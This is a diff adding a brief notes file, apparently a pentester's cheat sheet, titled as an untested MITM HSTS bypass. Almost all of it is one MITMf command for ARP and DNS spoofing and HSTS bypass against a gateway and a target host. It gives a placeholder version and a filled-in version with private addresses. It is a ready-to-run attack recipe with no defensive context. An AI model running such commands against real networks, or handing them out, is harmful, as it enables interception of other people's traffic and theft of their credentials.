@@ -1,0 +1,8 @@
+MITM HSTS Bypass (have not tested yet)
+
+use mitmf.py
+
+python mitmf.py -i <interface> --spoof --arp --dns --hsts --gateway <gatewayIP> --targets <targetIP>
+	ex:
+		python mitmf.py -i eth0 --spoof --arp --dns --hsts --gateway 192.168.1.1 --targets 192.168.1.2
+
